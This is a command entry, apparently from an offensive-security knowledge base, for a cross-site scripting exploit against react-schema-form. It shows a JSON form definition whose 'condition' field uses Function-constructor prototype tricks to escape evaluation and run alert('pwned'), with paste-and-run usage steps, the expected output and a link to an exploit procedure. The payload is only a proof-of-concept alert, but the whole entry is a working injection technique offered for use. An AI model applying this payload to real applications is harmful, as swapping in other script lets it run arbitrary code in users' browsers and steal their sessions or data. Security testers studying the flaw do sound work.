---
id: i9j0k1l2-m3n4-5678-ijkl-901234567890
name: configure-malicious-form-json
type: command
executor: json
data: >-
  [{"key": "comments","condition": "function fn() {};var constructorProperty =
  Object.getOwnPropertyDescriptors(fn.__proto__.constructor);var properties =
  Object.values(constructorProperty);properties.pop();properties.pop();properties.pop();var
  Func = properties.map(function (x) {return x.bind(x, 'return this.alert(`pwned
  `)')}).pop();(Func())()","type": "radios","titleMap": [{"value": "S","name":
  "Shipping"},{"value": "P","name": "Pickup"}]}]
output: Form rendering executes alert('pwned')
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:24.329Z'
platforms:
  - Web
tags:
  - xss
  - injection
verified: false
validated: true
submitted: true
---

# configure-malicious-form-json

## Command

```json
[{"key": "comments","condition": "function fn() {};var constructorProperty = Object.getOwnPropertyDescriptors(fn.__proto__.constructor);var properties = Object.values(constructorProperty);properties.pop();properties.pop();properties.pop();var Func = properties.map(function (x) {return x.bind(x, 'return this.alert(`pwned `)')}).pop();(Func())()","type": "radios","titleMap": [{"value": "S","name": "Shipping"},{"value": "P","name": "Pickup"}]}]
```

## Description

JSON array configuring a form field with a malicious condition payload adapted for browser XSS in react-schema-form.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| condition | Adapted payload for browser alert | Yes |

## Examples

### Basic Usage

Paste the JSON into the form editor of the react-schema-form demo.

### Advanced Usage

Modify titleMap values or add more fields for complex forms.

## Expected Output

Form renders with radios; condition evaluates to alert('pwned ') on interaction.

## Related

- [[commands/set-required-schema]]
- [[procedures/Exploit-XSS-in-react-schema-form]]
